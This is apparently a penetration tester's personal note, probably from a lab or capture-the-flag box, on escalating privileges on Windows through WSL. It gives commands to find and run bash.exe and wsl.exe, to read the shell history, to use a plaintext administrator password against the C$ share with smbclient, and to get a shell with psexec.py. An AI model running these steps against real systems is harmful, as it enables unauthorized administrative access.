[[99.__Links (WINDOWS)#Escalation Path Windows Subsystem for Linux]]

```powershell - target
Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss | %{Get-ItemProperty $_.PSPath} | out-string -width 4096
```

```command prompt - windows
where /R C:\windows bash.exe
```

```command prompt - windows
where /R C:\windows wsl.exe
```


![[Pasted image 20220203172255.png]]

```command prompt - windows
C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe whoami
```

![[Pasted image 20220203172529.png]]

```command prompt - windows
C:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
```

```bash - wsl
uname -a
```

![[Pasted image 20220203172713.png]]

![[Python#Shell break]]

```bash - wsl
history
```

![[Pasted image 20220203173050.png]]

```bash - kali
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\$TARGET\\c$
```

[[zz._Gaining Shell Access (psexec.py)]]

```bash - kali
psexec.py '$USER:$PASSWORD'@$TARGET
```
